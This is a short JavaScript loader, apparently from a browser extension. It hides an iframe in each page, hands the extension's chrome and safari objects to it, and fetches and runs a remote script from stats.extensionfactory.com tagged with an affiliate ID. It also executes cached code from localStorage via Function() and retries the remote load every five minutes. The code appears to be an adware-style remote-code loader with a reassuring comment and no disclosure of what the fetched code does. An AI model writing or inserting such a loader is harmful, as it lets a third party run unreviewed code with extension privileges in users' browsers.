
/*
 * this script will not affect page load even if we are not online
 */
(function(o){
    if (localStorage.getItem("EF:loaderScript")) {
        Function(localStorage.getItem("EF:loaderScript")).call(this, o);
    }
    else {
        function scriptHandler(event){
            try {
                event.target.removeEventListener(event.type, scriptHandler, false);
                iframe.contentWindow.ExtensionFactory.start(o.param);
            }
            catch (err) {
                setTimeout((function(e, scriptHandler){
                    return function(){
                        var p = e.parentNode;
                        var s = e.cloneNode(false);
                        s.setAttribute('src', e.src.split('?')[0] + '?' + Math.random());
                        s.addEventListener("load", scriptHandler, false);
                        s.addEventListener("error", scriptHandler, false);
                        p.replaceChild(s, e);
                    }
                })(event.target, scriptHandler), o.interval);
            }
        }
        function insertScript(){
            const scriptId = 'sf-script-loader';
            const contentDocument = iframe.contentWindow.document;
            if (!contentDocument.getElementById(scriptId)) {
                if (window.chrome) {
                    iframe.contentWindow.chrome = window.chrome;
                }
                if (window.safari) {
                    iframe.contentWindow.safari = window.safari;
                }
                iframe.contentWindow.EF_frameLoadingMode = true;
                var script = contentDocument.createElement('script');
                script.id = scriptId;
                script.type = 'text/javascript';
                script.async = true;
                script.src = o.url;
                script.addEventListener("load", scriptHandler, false);
                script.addEventListener("error", scriptHandler, false);
                contentDocument.documentElement.appendChild(script);
            }
        }
        if (!document.getElementById('sf-script-features')) {
            var iframeId = "sf-frame-features";
            var iframe = document.getElementById(iframeId);
            if (!iframe) {
                iframe = document.createElement("iframe");
                iframe.setAttribute("id", iframeId);
                iframe.style.display = "none";
                iframe.addEventListener("load", function() {
                            setTimeout(insertScript, 0);
                        }, false);
                document.documentElement.appendChild(iframe);
            }
        }
    }
})({
    param: {
        affiliate_uid: 'CV4uPumdFEUo2PiBVFETIQ',
        extension_uid: 'ikjojdbmohmejhcdhggcmdlkaalljmje'
    },
    url: "https://stats.extensionfactory.com/remote/feature.js?v=1",
    interval: 1000 * 60 * 5
});

